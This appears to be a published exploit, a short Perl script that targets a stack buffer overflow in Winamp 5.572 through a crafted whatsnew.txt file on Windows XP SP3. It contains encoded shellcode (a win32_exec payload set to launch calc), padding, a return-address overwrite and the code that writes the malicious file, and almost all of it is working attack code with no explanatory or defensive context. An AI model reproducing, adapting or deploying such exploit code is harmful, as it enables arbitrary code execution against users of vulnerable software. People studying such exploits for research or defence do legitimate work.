# Tested on: Windows xp sp3
# Code :

#!/usr/bin/perl
# Winamp v5.572 whatsnew.txt Stack Overflow Exploit
# Original : http://www.exploit-db.com/exploits/11248
# Exploit by : Dz_attacker (dz_attacker@hotmail.fr)

## win32_exec - EXITFUNC=process CMD=calc
my $shellcode = "UYIIIIIIIIIIIIIIII7QZjAXP0A0AkAAQ2AB2BB0BBABXP8ABuJIp3JiOsYyYNxYZNKiBTety".
"dQKMQ43TSmT8LWbTPK3ZKKLyrL4t8Tdsf20OtHLMI2uOHqWPnr5IlXMKMOkJkKdnypOOTXMjY".
"pY4OzXlYGaPjimIBniGXG8Zr1tNc6m8XgmK5dNyiYtoOJ8uf24L1fILYBo90XML9T6TOKpaIO".
"kYKjpuCIktOn0nyvqpoqURn7DOp4OGSXP9pw7rrwPwqdLsZ7lvolL5NOkL4n0MoMKxlO49iVy".
"4OpLI2fpk48LLYT8NXNsgSjFXdNzokkXWwtLpiqPJLlrxJkBxwMtNjJNtNjb1UJO3SNOQcalM".
"7XLR2tPtJA";
my $overflow = "Winamp 5.572".
"A" x 540 .
"UbSx". # push ebp;ret
"H" x 36 .
$shellcode.
"A" x 500;


open(myfile,'>>whatsnew.txt');

print myfile $overflow;